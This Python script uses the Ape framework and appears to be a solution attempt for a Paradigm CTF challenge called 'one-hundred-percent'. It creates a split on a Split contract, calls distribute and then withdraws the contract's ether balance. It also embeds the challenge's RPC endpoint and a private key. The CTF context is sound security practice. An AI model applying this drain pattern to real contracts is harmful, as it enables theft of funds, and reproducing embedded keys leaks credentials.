#!/usr/bin/python3
from ape import accounts, convert, networks, project

# maybe re-entrancy

"""
rpc endpoints:
    - http://one-hundred-percent.challenges.paradigm.xyz:8545/51470e0c-dfa5-432a-a7c9-bbd5ef6384ba/main
private key:        0x0fb15edde36480796a1990b29dbac13f73ae17fe57be2e024ace9b1300513c8f
challenge contract: 0xF34cff576e8Ce72a6b7d3202f1f4F2543aEFC2F5
"""

"""
0x000000000000000000000000000000000000dEaD + 0x000000000000000000000000000000000000bEEF + 5000 + 5000 + 0
"""


def attack():
    attacker = accounts.load("100_percent")
    attacker.set_autosign(True, passphrase="a")

    challenge = project.Challenge.at("0xF34cff576e8Ce72a6b7d3202f1f4F2543aEFC2F5")
    split = project.Split.at(challenge.SPLIT())

    attacker.transfer(account=split, value="20 ether")

    addresses = [
        "0x000000000000000000000000000000000000dEaD",
        "0x000000000000000000000000000000000000bEEF",
    ]
    percents = [5 * 10**5, 5 * 10**5]  # 5e5

    splits_id = split.splitsById(0)
    split_id = split.createSplit(addresses, percents, 0, sender=attacker)

    print(f"Split ID: {split_id}")
    print(f"Solved: {split.isSolved()}")

    print(f"Attacker balance: {attacker.balance // 10 ** 18}")
    print(f"Split balance: {split.balance // 10 ** 18}")
    

    split.distribute(
        0,
        addresses,
        percents,
        0,
        "0x0000000000000000000000000000000000000000",
        sender=attacker,
    )

    tokens = ["0x0000000000000000000000000000000000000000"]
    amounts = [split.balance]

    split.withdraw(tokens, amounts, sender=attacker)

    print(challenge.isSolved())

def main():
    attack()


if __name__ == "__main__":
    main()
